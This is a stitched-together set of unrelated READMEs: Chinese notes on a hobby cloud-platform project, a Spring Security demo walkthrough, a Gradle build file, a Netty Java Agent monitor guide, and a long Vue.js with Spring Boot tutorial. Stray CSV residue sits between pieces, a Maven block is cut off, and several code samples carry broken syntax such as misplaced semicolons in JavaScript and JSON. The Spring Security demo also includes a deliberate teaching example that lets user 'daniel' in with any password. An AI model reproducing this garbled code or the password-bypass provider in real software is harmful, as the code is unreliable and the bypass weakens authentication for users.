本人会不断自底向上真实搭建这样一套接地气的迷你云计算、中台体系，通过代码和终端来分享、发现和真实维护。
##### 7.1.6. 这种项目的要学习需要多少知识储备？
很多东西的建设都是系统工程，系统两字易写却难做，很多人需要一生去真正理解系统两字。
与传统业务项目的CRUD不同，这类项目是全链路的，说大是迷你搭建整个中台、云体系，说小可以说是造操作系统小玩具。
吹牛逼容易、落地困难，我要的核心是落地，""我真有一头牛""，因此这里没有一堆高大上的技术概念、技术黑话，很多技术和概念我会去简化、落地化而不是去卷所谓“优化”。
最后这个问题没有答案，迭代就是学习，就是储备，小白也有资格成长。

### 7.4 ☣ 技术债声明, Acknowledgement ⚠
非严谨说明，由于本人技术栈杂、本人习惯等，且涉及项目历史长、本项目工程量巨大。可能导致部分概念、设计、不一定是当前Java技术栈体系下最优实现或最紧扣概念的设计。
* 举个栗子：本人学习方法是先脑补，再补过程和概念，且先保业务开发进度的方法论（先验和迁移学习，说人话就是快速混用其他技术栈概念或实践，而非完美调研，反正不影响结果和功能）。
因此可能存在概念出错、不严谨，后续再还技术债的现象，但这不影响我们持续认真检查以确保最终质量。
* 永无止境、实践出真知：Rome was not built in a day, 项目涉及的技术门类较多，这个项目是我本科和研究生期间的业余爱好项目。
虽然已尽可能搭建真实平台、实践、学习，但本人工作经验有限，因此不能保证不犯错误（甚至低级错误），欢迎批评指正，持续迭代。

Code for ""Spring Security: The Good Parts""

## Demo scenario


### Step 1: A Boot app, with no security

We create a `/public` and `/private` page. No security is applied.

The `/private` page has some tricks to show a logout button ... if some `_csrf` token is available.
It's not the case yet, it will be injected by Spring Security later on. When you think about it, it
makes sense: you can't ""log in"", so you shouldn't be able to ""log out"" either.

### Step 2: Basic Spring-Security setup

We introduce Spring Security. We create a `SecurityConfig` configuration class, where we will store
all of our security-related configuration customizations.

The first customization is to create a custom SecurityFilterChain, to override the defaults that
Spring Boot give us. We make sure that every request must be authenticated, except the few things
that we deem ""public"", such as `/` (public page), the favicon, the css resources, etc. We also
introduce `.formLogin()` to ensure form login is enabled for us.

We also introduce our own UserDetailsService, because we don't want to have to copy the random
password that Boot generates every time we boot up the app. It's an in-memory implementation, for
demo purposes.

Finally, we leverage the `Authentication` object that Spring Security creates for us to display the
name of the logged-in user.

### Step 3: Add SSO, with oauth2-login

We add the dependencies and the code to make SSO login work. It requires adding some properties, and
just enabling ""oauth2 login"" in our previous security configuration. Everything stays the same.

We want a nicer ""authentication name"" when logged in with Google, rather than the ID we get back, so
we tweak our GreetingController to display the e-mail when doing SSO login.

### Step 4: Our first Filter

We create our first Filter, the `ForbiddenFilter`. It sets the response code to 403 (Forbidden), with
an error message, when the `x-forbidden: true` header is present. Otherwise it's a no-op.

We register it in our filter chain. We can register before any filter we know. It is usally
recommended to register it at least before `AuthorizationFilter`, which is the filter that does the
checks for `http.authorizeHttpRequests`.

You can see the results, e.g. using HTTPie or cURL:

```shell
$ curl localhost:8080 -H ""x-forbidden: true"" -v
$ # or
$ http localhost:8080 x-forbidden:true
```

### Step 5: RobotAuthenticationFilter

We create a filter that authenticates the user. In this case, it's a ""robot account"" that sends us a
secret password in the `X-Robot-Password` header.

If the header is present, we make sure the password is correct. If the password is incorrect, we
reject the request. If the password is fine, we perform the actual authentication by creating an
instance of an appropriate implementation of the `Authentication` interface.

If the header is absent, we let the rest of the filter chain decide what to do.

See:

```shell
$ curl localhost:8080/private -H ""x-robot-password: beep-boop""
$ # or
$ http localhost:8080/private x-robot-password:beep-boop
```

### Step 6: Our first AuthenticationProvider, because user ""daniel"" is _special_

We create an AuthenticationProvider that will let user ""daniel"" in, no matter the password.

We also turn on HTTP Basic authentication - and we don't have to do anything to grant the same
rights to ""daniel"".

See:

```shell
$ curl localhost:8080/private -u ""daniel:foobar""
$ # or
$ http localhost:8080/private --auth ""daniel:barfoo""
```

This leverages the `ProviderManager`, which, for examples, produces Spring events when a login
succeeds or fails. We listen to `AuthenticationSuccessEvents` and do a System.out.println with the
Authentication class and the Authentication name. Notice how RobotAuthentications are _not_ logged,
as they happen directly in a filter, without using an AuthenticationManager.

### Step 7: Rework the RobotAuthenticationFilter to use AuthenticationManager

We make sure the RobotAuthenticationFilter actually uses an Authentication Manager, like the rest of
Spring Security. To do this, we need to create an ""unauthenticated"" version of the
RobotAuthentication. We also need an AuthenticationProvider to handle those RobotAuthentication.

To get an AuthenticationManager, we access the Filter chain's local AuthenticationManager. See
the [Spring Security without the WebSecurityConfigurerAdapter blog post](https://spring.io/blog/2022/02/21/spring-security-without-the-websecurityconfigureradapter),
which talks about how to access that class. We create a bespoke AbstractHttpConfigurer and put all
Robot-related configuration in the class, so we can get the authentication manager.

### Step8: Rework the RobotAuthenticationFilter to extend AuthenticationFilter

Most `Authentication` filters in Spring Security can be written as an `AuthenticationFilter`
sublclass. It follows a simple ""composition"" pattern, where you declard an
`AuthenticationConverter`, an `AuthenticationManager`, and both success and failure handlers. The
wiring is then done by the base class, which does:

1. HttpRequest -> [AuthenticationConverter] -> Authentication
2. Authentication -> [AuthenticationManager] -> Authentication in the SecurityContext (if succesful)
3. Authentication(Exception) -> [Authentication(Success|Failure)Handler]

```groovy
plugins {
    id 'java-library'
}

repositories {
    mavenCentral()
    jcenter()
}

group = 'org.omnione.did'
jar {
    archiveBaseName.set('did-wallet-sdk-server') 
    archiveVersion.set('1.0.0')
    archiveClassifier.set('') 
}

java {
    sourceCompatibility = '17'
    targetCompatibility = '17'
}

dependencies {
    implementation 'org.bouncycastle:bcprov-jdk18on:1.78.1'
    implementation 'com.google.guava:guava:33.2.1-jre'
    implementation 'com.google.code.gson:gson:2.8.9'
    implementation 'org.slf4j:slf4j-api:2.0.7'

    implementation files('libs/did-crypto-sdk-server-1.0.0.jar')
}

```

2. Open the `Gradle` tab in IDE and run the project's `Task > Build > Clean and Build` task, or type './gradlew clean and build' in a terminal.
3. Once the execution is complete, the `did-wallet-sdk-server-1.0.0.jar`  file will be generated in the `{projetPath}/build/libs/` folder.

# 1. 介绍

## 1.1 基本概况

该项目是基于Java  Agent的静态加载实现的Netty无侵入监控，创建目的是为了学习和使用Java Agent技术及Netty数据监控

## 1.2 技术栈

Java Agent + bytebuddy + Netty

## 1.3 使用方式

### 项目中

将代码打包为jar包，或者从标签处下载，在jar包运行时添加参数 -javaagent:agen包路径

例如项目包test.jar和agent包netty-monitor-agent-1.0.jar在同一目录，那么启动命令则如下：

```
 java -javaagent:./netty-monitor-agent-1.0.jar.jar  -jar  test.jar
```

### IDEA中

点击 Add VM options，然后在该行中填入 -javaagent:agent包路径，如下：

```
-javaagent:./netty-monitor-agent-1.0.jar.jar
```

如果需要Debug，则把该agent包的依赖导入即可

## 2. 其它

### 2.1 自定义输出

#### 侵入式（不推荐）

在项目包中引入agent依赖，实现接口MonitorOutService，在该接口中进行监控数据输出，然后通过添加启动参数：-DmonitorOutServiceClass=实现类的全类名，如下：

```
public class TestMonitorOutService implements MonitorOutService {
    @Override
    public void outputMonitorData(GlobalMonitorData globalMonitorData, List<EventLoopMonitorData> eventLoopMonitorDataList, List<ChannelMonitorData> channelMonitorDataList) {
        System.out.println(""测试输出"");
    }
}

启动参数：
-DmonitorOutServiceClass=com.github.netty.monitor.agent.test.TestMonitorOutService
```

#### 非侵入式

自己修改源码，实现接口MonitorOutService，然后添加启动参数：-DmonitorOutServiceClass=实现类的全类名，之后再打jar去做无侵入监控，可以把监控数据持久化记录到Redis、MySQL等数据库中

### 2.2 监控数据

### 2.3 注意事项

1.该项目主要是学习为主，代码可供参考

2.支持JDK版本为1.8以上（其它版本需要自测）

3.暂不支持Netty版本为4.0.45.Final以下的，4.0.0至4.0.44.Final的版本需要自行通过反射去PlatformDepedent类中获取池化和非池化的数据

4.默认是控制台输出，如果导入了日志框架，则会打印日志，默认是每5秒打印一次，对于离线的Channel，离线的30秒后该Channel数据才会消失

5.最好自己修改源码，实现持久化数据存储",1,0,1,mit,0.0

## In Search of a new Web Frontend-Framework after 2 Years of absence...

Well, I’m not a Frontend developer. I’m more like playing around with Spring Boot, Web- & Microservices & Docker, automating things with Ansible and Docker, Scaling things with Spring Cloud, Docker Compose, and Traefik... And the only GUIs I’m building are the ""new JS framework in town""-app every two years... :) So the last one was Angular 1 - and it felt, as it was a good choice! I loved the coding experience and after a day of training, I felt able to write awesome Frontends...

But now we’re 2 years later and I heard from afar, that there was a complete rewrite of Angular (2), a new kid in town from Facebook (React) and lots of ES201x stuff and dependency managers like bower and Co. So I’m now in the new 2-year-cycle of trying to cope up again - and so glad I found this article: https://medium.com/reverdev/why-we-moved-from-angular-2-to-vue-js-and-why-we-didnt-choose-react-ef807d9f4163

Key points are:
* Angular 2 isn’t the way to go if you know version 1 (complete re-write, only with Typescript, loss of many of 1’s advantages, Angular 4 is coming)
* React  (facebookish problems (licence), need to choose btw. Redux & MObX, harder learning curve, slower coding speed)

![comparison-angular-react-vuejs](screenshots/comparison-angular-react-vuejs.png)

And the [introduction phrase](https://vuejs.org/v2/guide/index.html) sounds really great:

> Vue (pronounced /vjuː/, like view) is a progressive framework for building user interfaces. Unlike other monolithic frameworks, Vue is designed from the ground up to be incrementally adoptable. The core library is focused on the view layer only and is very easy to pick up and integrate with other libraries or existing projects. On the other hand, Vue is also perfectly capable of powering sophisticated Single-Page Applications when used in combination with modern tooling and supporting libraries.

So I think, it could be a good idea to invest a day or so into Vue.js. Let’s have a look here!



## Setup Vue.js & Spring Boot

### Prerequisites

#### MacOSX

```
brew install node
npm install -g @vue/cli
```

#### Linux

```
sudo apt update
sudo apt install node
npm install -g @vue/cli
```

#### Windows

```
choco install npm
npm install -g @vue/cli
```

## Project setup

```
spring-boot-vuejs
├─┬ backend     → backend module with Spring Boot code
│ ├── src
│ └── pom.xml
├─┬ frontend    → frontend module with Vue.js code
│ ├── src
│ └── pom.xml
└── pom.xml     → Maven parent pom managing both modules
```

## Backend

Go to https://start.spring.io/ and initialize a Spring Boot app with `Web` and `Actuator`. Place the zip’s contents in the backend folder.

Customize pom to copy content from Frontend for serving it later with the embedded Tomcat:

```xml
<build>
  <plugins>
    <plugin>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-maven-plugin</artifactId>
    </plugin>
    <plugin>
      <artifactId>maven-resources-plugin</artifactId>
      <executions>
        <execution>
          <id>copy Vue.js frontend content</id>
          <phase>generate-resources</phase>
          <goals>
            <goal>copy-resources</goal>
          </goals>
          <configuration>
            <outputDirectory>src/main/resources/public</outputDirectory>

## Frontend

Creating our `frontend` project is done by the slightly changed (we use `--no-git` here, because our parent project is already a git repository and otherwise vue CLI 3 would initialize an new one):

```
vue create frontend --no-git
```

see https://cli.vuejs.org/guide/

This will initialize a project skeleton for Vue.js in /frontend directory - it, therefore, asks some questions in the cli:

![vuejs-cli3-create](screenshots/vuejs-cli3-create.png)

__Do not__ choose the default preset with `default (babel, eslint)`, because we need some more plugins for our project here (choose the Plugins with the __space bar__):

![vuejs-cli3-select-plugins](screenshots/vuejs-cli3-select-plugins.png)

You can now also use the new `vue ui` command/feature to configure your project:

![vue-ui](screenshots/vue-ui.png)

If you want to learn more about installing Vue.js, head over to the docs: https://vuejs.org/v2/guide/installation.html


### Use frontend-maven-plugin to handle NPM, Node, Bower, Grunt, Gulp, Webpack and so on :)

If you’re a backend dev like me, this Maven plugin here https://github.com/eirslett/frontend-maven-plugin is a great help for you - because, if you know Maven, that’s everything you need! Just add this plugin to the frontend’s `pom.xml`:

```xml
<build>
    <plugins>
        <plugin>
            <groupId>com.github.eirslett</groupId>
            <artifactId>frontend-maven-plugin</artifactId>
            <version>${frontend-maven-plugin.version}</version>
            <executions>
                <!-- Install our node and npm version to run npm/node scripts-->
                <execution>
                    <id>install node and npm</id>
                    <goals>
                        <goal>install-node-and-npm</goal>
                    </goals>
                    <configuration>
                        <nodeVersion>v10.10.0</nodeVersion>
                    </configuration>
                </execution>
                <!-- Install all project dependencies -->
                <execution>
                    <id>npm install</id>
                    <goals>
                        <goal>npm</goal>
                    </goals>
                    <!-- optional: default phase is ""generate-resources"" -->
                    <phase>generate-resources</phase>
                    <!-- Optional configuration which provides for running any npm command -->
                    <configuration>
                        <arguments>install</arguments>
                    </configuration>
                </execution>
                <!-- Build and minify static files -->
                <execution>
                    <id>npm run build</id>
                    <goals>
                        <goal>npm</goal>
                    </goals>
                    <configuration>
                        <arguments>run build</arguments>
        </configuration>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

### Tell Webpack to output the dist/ contents to target/

Commonly, node projects will create a dist/ directory for builds which contains the minified source code of the web app - but we want it all in `/target`. Therefore we need to create the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js) and configure the `outputDir` and `assetsDir` correctly: 

```javascript
module.exports = {
  ...
  // Change build paths to make them Maven compatible
  // see https://cli.vuejs.org/config/
  outputDir;: 'target/dist',
  assetsDir;: 'static';
}
```


## First App run

Inside the root directory, do a: 

```
mvn clean install
```

Run our complete Spring Boot App:

```
mvn --projects backend spring-boot:run
```

Now go to http://localhost:8098/ and have a look at your first Vue.js Spring Boot App.



## Faster feedback with webpack-dev-server

The webpack-dev-server, which will update and build every change through all the parts of the JavaScript build-chain, is pre-configured in Vue.js out-of-the-box! So the only thing needed to get fast feedback development-cycle is to cd into `frontend` and run:

```
npm run serve
```

That’s it! 


## Browser developer tools extension

Install vue-devtools Browser extension https://github.com/vuejs/vue-devtools and get better feedback, e.g. in Chrome:

![vue-devtools-chrome](screenshots/vue-devtools-chrome.png)


## IntelliJ integration

There's a blog post: https://blog.jetbrains.com/webstorm/2018/01/working-with-vue-js-in-webstorm/

Especially the `New... Vue Component` looks quite cool :)



## HTTP calls from Vue.js to (Spring Boot) REST backend

Prior to Vue 2.0, there was a build in solution (vue-resource). But from 2.0 on, 3rd party libraries are necessary. One of them is [Axios](https://github.com/mzabriskie/axios) - also see blog post https://alligator.io/vuejs/rest-api-axios/

```
npm install axios --save
```

Calling a REST service with Axios is simple. Go into the script area of your component, e.g. Hello.vue and add:

```js
import axios from 'axios'

data ();{
  return {
    response: [],
    errors: []
  }
},

callRestService ();{
  axios.get(`api/hello`)
    .then(response => {
      // JSON responses are automatically parsed.
      this.response = response.data
    })
    .catch(e => {
      this.errors.push(e)
    })
}
}
```

In your template area you can now request a service call via calling `callRestService()` method and access `response` data:

```html
<button class=”Search__button” @click=""callRestService()"">CALL Spring Boot REST backend service</button>

<h3>{{ response }}</h3>
```

### The problem with SOP

Single-Origin Policy (SOP) could be a problem if we want to develop our app. Because the webpack-dev-server runs on http://localhost:8080 and our Spring Boot REST backend on http://localhost:8098.

We need to use Cross-Origin Resource Sharing Protocol (CORS) to handle that (read more background info about CORS here https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS)


#### Enabling Axios CORS support

Create a central Axios configuration file called `http-commons.js`:

```js
import axios from 'axios'

export const AXIOS = axios.create({
  baseURL: `http://localhost:8098`,
  headers: {
    'Access-Control-Allow-Origin': 'http://localhost:8080'
  }
})
```

Here we allow requests to the base URL of our Spring Boot App on port 8098 to be accessible from 8080.

Now we could use this configuration inside our Components, e.g. in `Hello.vue`:
```js
import {AXIOS} from './http-common'

export default {
  name: 'hello',

  data () {
    return {
      posts: [],
      errors: []
    }
  },
  methods: {
    // Fetches posts when the component is created.
    callRestService () {
      AXIOS.get(`hello`)
        .then(response => {
          // JSON responses are automatically parsed.
          this.posts = response.data
        })
        .catch(e => {
          this.errors.push(e)
        })
    }
  }
```

#### Enabling Spring Boot CORS support

Additionally, we need to configure our Spring Boot backend to answer with the appropriate CORS HTTP Headers in its responses (there's a good tutorial here: https://spring.io/guides/gs/rest-service-cors/). Therefore we add the annotation `@CrossOrigin` to our BackendController:

```java
@CrossOrigin(origins = ""http://localhost:8080"")
@RequestMapping(path = ""/hello"")
public @ResponseBody String sayHello() {
    LOG.info(""GET called on /hello resource"");
    return HELLO_TEXT;
}
```

Now our Backend will respond CORS-enabled and will accept requests from 8080. But as this only enables CORS on one method, we have to repeatedly add this annotation to all of our REST endpoints, which isn’t a nice style. We should use a global solution to allow access with CORS enabled to all of our REST resources. This could be done in the `SpringBootVuejsApplication.class`:

```java
// Enable CORS globally
@Bean
public WebMvcConfigurer corsConfigurer() {
  return new WebMvcConfigurerAdapter() {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
      registry.addMapping(""/api/*"").allowedOrigins(""http://localhost:8080"");
    }
  };
}
```

Now all calls to resources behind `api/` will return the correct CORS headers. 


#### But STOP! Webpack & Vue have something much smarter for us to help us with SOP!

Thanks to my colleague [Daniel](https://www.codecentric.de/team/dre/) who pointed me to the nice proxying feature of Webpack dev-server, we don't need to configure all the complex CORS stuff anymore!

According to the [Vue CLI 3 docs](https://cli.vuejs.org/config) the only thing we need to [configure is a devserver-proxy](https://cli.vuejs.org/config/#devserver-proxy) for our webpack devserver requests. This could be done easily in the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js) inside `devServer.proxy`: 

```js
module.exports = {
  // proxy all webpack dev-server requests starting with /api
  // to our Spring Boot backend (localhost:8098) using http-proxy-middleware
  // see https://cli.vuejs.org/config/#devserver-proxy
  devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:8098',
        ws: true,
        changeOrigin: true
      }
    }
  },
  ...
}
```

With this configuration in place, the webpack dev-server uses the [http-proxy-middleware](https://github.com/chimurai/http-proxy-middleware), which is a really handy component, to proxy all frontend-requests from http://localhost:8080 --> http://localhost:8098 - incl. Changing the Origin accordingly.

This is used in the webpack build process to configure the proxyMiddleware (you don't need to change something here!):

```js
// proxy api requests
Object.keys(proxyTable).forEach(function (context) {
  var options = proxyTable[context];
  if (typeof options === 'string') {
    options = { target: options }
  }
  app.use(proxyMiddleware(options.filter || context, options))
})
```

## Using history mode for nicer URLs

If we use the default configuration of the generated Vue.js template, we see URLs with a `#` inside them - like this:

```
http://localhost:8098/#/bootstrap

or

http://localhost:8098/#/user
```

With the usage of __[HTML5 history mode](https://router.vuejs.org/guide/essentials/history-mode.html#html5-history-mode)__, we can achieve much nicer URLs without the `#` in them. Only thing to do in the Vue.js frontend is to configure our router accordingly inside the [router.js](frontend/src/router.js):

```
...

Vue.use(Router);

const router = new Router({
    mode: 'history', // uris without hashes #, see https://router.vuejs.org/guide/essentials/history-mode.html#html5-history-mode
    routes: [
        { path: '/', component: Hello },
        { path: '/callservice', component: Service },
        ...
```

That's nearly everything. BUT only nearly! If one clicks on a link inside our frontend, the user is correctly send to the wished component. 

But if the user enters the URL directly into the Browser, we get a `Whitelabel Error Page` because our Spring Boot backend gives us a __HTTP 404__ - since this URL isn't present in the backend:

![html5-history-mode-whitelabel-error-page-404](screenshots/html5-history-mode-whitelabel-error-page-404.gif)

The solution is to redirect or better forward the user to the frontend (router) again. The [Vue.js docs don't provide an example configuration for Spring Boot](https://router.vuejs.org/guide/essentials/history-mode.html#example-server-configurations), but luckily [there are other resources](https://www.baeldung.com/spring-redirect-and-forward). In essence we have to implement a forwarding controller in our [BackendController](backend/src/main/java/de/jonashackt/springbootvuejs/controller/BackendController.java):

```
    // Forwards all routes to FrontEnd except: '/', '/index.html', '/api', '/api/**'
    // Required because of 'mode: history' usage in frontend routing, see README for further details
    @RequestMapping(value = ""{_:^(?!index\\.html|api).$}"")
    public String redirectApi() {
        LOG.info(""URL entered directly into the Browser, so we need to redirect..."");
        return ""forward:/"";
    }
```

This controller will forward every request other then `'/', '/index.html', '/api', '/api/**'` to our Vue.js frontend.


## Bootstrap & Vue.js

There’s a nice integration of Bootstrap in Vue.js: https://bootstrap-vue.js.org/

```
npm install bootstrap-vue
```

Now you can use all the pretty Bootstrap stuff with ease like:

```
<b-btn @click=""callRestService()"">CALL Spring Boot REST backend service</b-btn>
```

instead of

```
<button type=""button"" class=”btn” @click=""callRestService()"">CALL Spring Boot REST backend service</button>
```

The docs contain all the possible components: https://bootstrap-vue.js.org/docs/components/alert/

See some elements, when you go to http://localhost:8080/#/bootstrap/ - this should look like this:

![bootstrap-styled-vuejs](screenshots/bootstrap-styled-vuejs.png)

A good discussion about various UI component frameworks: http://vuetips.com/bootstrap


## Heroku Deployment

As you may already read, the app is automatically deployed to Heroku on https://spring-boot-vuejs.herokuapp.com/.

The project makes use of the nice Heroku Pipelines feature, where we do get a full Continuous Delivery pipeline with nearly no effort:

![heroku-pipeline](screenshots/heroku-pipeline.png)

And with the help of super cool `Automatic deploys`, we have our GitHub Actions build our app after every push to master - and with the checkbox set to `Wait for CI to pass before deploy` - the app gets also automatically deployed to Heroku - but only, if the GitHub Actions (and Codegov...) build succeeded:

![heroku-automatic-deploys](screenshots/heroku-automatic-deploys.png)

You only have to connect your Heroku app to GitHub, activate Automatic deploys and set the named checkbox. That's everything!


#### Accessing Spring Boot REST backend on Heroku from Vue.js frontend

Frontend needs to know the Port of our Spring Boot backend API, which is [automatically set by Heroku every time, we (re-)start our App](https://stackoverflow.com/a/12023039/4964553).

> You can [try out your Heroku app locally](https://devcenter.heroku.com/articles/heroku-local)! Just create a .env-File with all your Environment variables and run `heroku local`! 

To access the Heroku set port, we need to use relative paths inside our Vue.js application instead of hard-coded hosts and ports! 

All we need to do is to configure Axios in such a way inside our [frontend/src/components/http-common.js](https://github.com/jonashackt/spring-boot-vuejs/blob/master/frontend/src/components/http-common.js):

```
export const AXIOS = axios.create({
  baseURL: `/api`
})
```

#### Using Heroku's Postgres as Database for Spring Boot backend and Vue.js frontend

First, add [Heroku Postgres database](https://elements.heroku.com/addons/heroku-postgresql) for your Heroku app. 

Then follow these instructions on Stackoverflow to configure all needed Environment variables in Heroku: https://stackoverflow.com/a/49978310/4964553

Mind the addition to the backend's [pom.xml](backend/pom.xml) described here: https://stackoverflow.com/a/49970142/4964553

Now you're able to use Spring Data's magic - all you need is an Interface like [UserRepository.java](backend/src/main/java/de/jonashackt/springbootvuejs/repository/UserRepository.java):

```java
package de.jonashackt.springbootvuejs.repository;

import de.jonashackt.springbootvuejs.domain.User;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.query.Param;

import java.util.List;

public interface UserRepository extends CrudRepository<User, Long> {

    List<User> findByLastName(@Param(""lastname"") String lastname);

    List<User> findByFirstName(@Param(""firstname"") String firstname);

}

```

Now write your Testcases accordingly like [UserRepositoryTest.java](backend/src/test/java/de/jonashackt/springbootvuejs/repository/UserRepositoryTest.java):

```java
package de.jonashackt.springbootvuejs.repository;

import de.jonashackt.springbootvuejs.domain.User;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest;
import org.springframework.boot.test.autoconfigure.orm.jpa.TestEntityManager;
import org.springframework.test.context.junit4.SpringRunner;

import java.util.List;

import static org.hamcrest.Matchers.contains;
import static org.junit.Assert.*;

@RunWith(SpringRunner.class)
@DataJpaTest
public class UserRepositoryTest {

  @Autowired
  private TestEntityManager entityManager;

  @Autowired
  private UserRepository users;

  private final User norbertSiegmund = new User(""Norbert"", ""Siegmund"");
  private final User jonasHecht = new User(""Jonas"", ""Hecht"");

  @Before
  public void fillSomeDataIntoOurDb() {
    // Add new Users to Database
    entityManager.persist(norbertSiegmund);
    entityManager.persist(jonasHecht);
  }

  @Test
  public void testFindByLastName() throws Exception {
    // Search for specific User in Database according to lastname
    List<User> usersWithLastNameSiegmund = users.findByLastName(""Siegmund"");

    assertThat(usersWithLastNameSiegmund, contains(norbertSiegmund));
  }


  @Test
  public void testFindByFirstName() throws Exception {
    // Search for specific User in Database according to firstname
    List<User> usersWithFirstNameJonas = users.findByFirstName(""Jonas"");

    assertThat(usersWithFirstNameJonas, contains(jonasHecht));
  }

}
```

Then include this functionality in your REST-API - see [BackendController.java](backend/src/main/java/de/jonashackt/springbootvuejs/controller/BackendController.java):

```java
    @RequestMapping(path = ""/user"", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.CREATED)
    public @ResponseBody long addNewUser (@RequestParam String firstName, @RequestParam String lastName) {
        User user = new User(firstName, lastName);
        userRepository.save(user);

        LOG.info(user.toString() + "" successfully saved into DB"");

        return user.getId();
    }
```
 
and use it from the Vue.js frontend, see [User.vue](frontend/src/components/User.vue):

```html
<template>
<div class=""user"">
 <h1>Create User</h1>

 <h3>Just some database interaction...</h3>

 <input type=""text"" v-model=""user.firstName"" placeholder=""first name"">
 <input type=""text"" v-model=""user.lastName"" placeholder=""last name"">

 <button @click=""createUser()"">Create User</button>

 <div v-if=""showResponse""><h6>User created with Id: {{ response }}</h6></div>

 <button v-if=""showResponse"" @click=""retrieveUser()"">Retrieve user {{user.id}} data from database</button>

 <h4 v-if=""showRetrievedUser"">Retrieved User {{retrievedUser.firstName}} {{retrievedUser.lastName}}</h4>

</div>
</template>

<script>
// import axios from 'axios'
import {AXIOS} from './http-common'

export default {
 name: 'user',

 data () {
   return {
     response: [],
     errors: [],
     user: {
       lastName: '',
       firstName: '',
       id: 0
     },
     showResponse: false,
     retrievedUser: {},
     showRetrievedUser: false
   }
 },
 methods: {
   // Fetches posts when the component is created.
   createUser () {
     var params = new URLSearchParams();
     params.append('firstName', this.user.firstName);
     params.append('lastName', this.user.lastName);

     AXIOS.post(`/user`, params)
       .then(response => {
         // JSON responses are automatically parsed.
         this.response = response.data;
         this.user.id = response.data;
         console.log(response.data);
         this.showResponse = true
       })
       .catch(e => {
         this.errors.push(e)
       })
   },
   retrieveUser () {
     AXIOS.get(`/user/` + this.user.id)
       .then(response => {
         // JSON responses are automatically parsed.
         this.retrievedUser = response.data;
         console.log(response.data);
         this.showRetrievedUser = true
       })
       .catch(e => {
         this.errors.push(e)
       })
   }
 }
}

</script>
```


## Testing 

### Install vue-test-utils

https://github.com/vuejs/vue-test-utils

`npm install --save-dev @vue/test-utils`

### Jest

Jest is a new shooting star in the sky of JavaScript testing frameworks: https://facebook.github.io/jest/

Intro-Blogpost: https://blog.codecentric.de/2017/06/javascript-unit-tests-sind-schwer-aufzusetzen-keep-calm-use-jest/

Examples: https://github.com/vuejs/vue-test-utils-jest-example

Vue.js Jest Docs: https://vue-test-utils.vuejs.org/guides/#testing-single-file-components-with-jest

A Jest Unittest looks like [Hello.spec.js](frontend/test/components/Hello.spec.js):

```js
import { shallowMount } from '@vue/test-utils';
import Hello from '@/components/Hello'

describe('Hello.vue', () => {
  it('should render correct hello message', () => {
    // Given
    const hellowrapped = shallowMount(Hello, {
      propsData: { hellomsg: 'Welcome to your Jest powered Vue.js App' },
      stubs: ['router-link', 'router-view']
    });

    // When
    const contentH1 = hellowrapped.find('h1');

    // Then
    expect(contentH1.text()).toEqual('Welcome to your Jest powered Vue.js App');
  })
})
```

To pass Component props while using Vue.js Router, see https://stackoverflow.com/a/37940045/4964553.

How to test components with `router-view` or `router-link` https://vue-test-utils.vuejs.org/guides/using-with-vue-router.html#testing-components-that-use-router-link-or-router-view.

The test files itself could be named `xyz.spec.js` or `xyz.test.js` - and could reside nearly everywhere in the project.

##### Jest Configuration  

The Jest run-configuration is done inside the [package.json](frontend/package.json):

```js
""scripts"";: {
    ...
    ""test:unit"";: ""vue-cli-service test:unit --coverage"",;
    ....
  },
```

Jest can be configured via `jest.config.js` in your project root, or the `jest` field in [package.json](frontend/package.json). In our case we especially need to configure `coverageDirectory`:

```json
  ],
  ""jest"": {
    ...
    ""coverageDirectory"": ""<rootDir>/tests/unit/coverage"",
    ""collectCoverageFrom"": [
      ""src/**/*.{js,vue}"",
      ""!src/main.js"",
      ""!src/router/index.js"",
      ""!**/node_modules/**""
    ]
  }
}
```

Jest needs to know the right output directory `/tests/unit/coverage` to show a correct output when `npm run test:unit` is run (or the corresponding Maven build). If you run the Jest Unit tests now with:

`npm run test:unit`

- you´ll recognize the table of test covered files:

![unittestrun-jest](screenshots/unittestrun-jest.png)


##### Integration in Maven build (via frontend-maven-plugin)

Inside the [pom.xml](pom.xml) we always automatically run the Jest Unittests with the following configuration:

```xml
<!-- Run Unit tests -->
  <execution>
    <id>npm run test:unit</id>
    <goals>
      <goal>npm</goal>
    </goals>
    <!-- optional: default phase is ""generate-resources"" -->
    <phase>test</phase>
    <!-- Optional configuration which provides for running any npm command -->
    <configuration>
      <arguments>run test:unit</arguments>
    </configuration>
  </execution>
```

This will integrate the Jest Unittests right after the npm run build command, just you are used to in Java-style projects:

![maven-integration-jest-unittests](screenshots/maven-integration-jest-unittests.png)

And don't mind the depiction with `ERROR` - this is just a known bug: https://github.com/eirslett/frontend-maven-plugin/issues/584


##### Run Jest tests inside IntelliJ

First, we need to install the NodeJS IntelliJ plugin (https://www.jetbrains.com/help/idea/developing-node-js-applications.html), which isn't bundled with IntelliJ by default:

![nodejs-intellij-plugin](screenshots/nodejs-intellij-plugin.png)

IntelliJ Jest integration docs: https://www.jetbrains.com/help/idea/running-unit-tests-on-jest.html

The automatic search inside the [package.json](frontend/package.json) for the Jest configuration file [jest.conf.js](frontend/test/unit/jest.conf.js) doesn't seem to work right now, so we have to manually configure the `scripts` part of:

```
""unit"": ""jest --config test/unit/jest.conf.js --coverage"",
```

inside the Run Configuration under `Jest` and `All Tests`:

![configure-jest-inside-intellij](screenshots/configure-jest-inside-intellij.png)

Now, when running `All Tests`, this should look like you're already used to Unittest IntelliJ-Integration:

![run-jest-inside-intellij](screenshots/run-jest-inside-intellij.png)

 

## End-2-End (E2E) tests with Nightwatch

Great tooling: http://nightwatchjs.org/ - Nightwatch controls WebDriver / Selenium standalone Server in own child process and abstracts from those, providing a handy DSL for Acceptance tests:

Docs: http://nightwatchjs.org/gettingstarted/#browser-drivers-setup

![http://nightwatchjs.org/img/operation.png](http://nightwatchjs.org/img/operation.png)

